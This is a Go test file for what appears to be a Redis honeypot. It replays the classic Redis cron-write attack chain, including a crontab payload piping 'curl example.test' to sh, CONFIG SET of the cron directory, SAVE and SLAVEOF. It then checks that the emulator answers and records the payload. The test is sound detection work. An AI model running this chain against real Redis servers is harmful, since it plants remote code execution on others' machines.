package TCP

import (
	"strings"
	"testing"
	"time"
)

func TestRedisService_WriteChainIsAnsweredAndRecorded(t *testing.T) {
	addr, tr := vncStartService(t, "../../../../configurations/services/tcp-6379-redis.yaml")

	payload := "*/1 * * * * curl example.test | sh"
	cases := []struct {
		name, request, want string
	}{
		{"keys", respRequest("KEYS", "*"), "*0"},
		{"flushall", respRequest("FLUSHALL"), "+OK"},
		{"set", respRequest("SET", "x", "\n\n"+payload+"\n\n"), "+OK"},
		{"setex is unknown", respRequest("SETEX", "x", "1", "y"), "-ERR unknown command"},
		{"config get dir", respRequest("CONFIG", "GET", "dir"), "*2"},
		{"config get dbfilename", respRequest("CONFIG", "GET", "dbfilename"), "*2"},
		{"config set", respRequest("CONFIG", "SET", "dir", "/var/spool/cron/"), "+OK"},
		{"inline config set", "CONFIG SET dir /tmp\r\n", "+OK"},
		{"save", respRequest("SAVE"), "+OK"},
		{"bgsave", respRequest("BGSAVE"), "+Background saving started"},
		{"slaveof", respRequest("SLAVEOF", "203.0.113.9", "6379"), "+OK"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := redisExchange(t, addr, tc.request); got != tc.want {
				t.Fatalf("reply = %q, want %q", got, tc.want)
			}
		})
	}

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		for _, ev := range tr.snapshot() {
			if ev.Handler == "write" && strings.Contains(ev.Command, payload) {
				return
			}
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatal("cron payload was not recorded in a trace event")
}
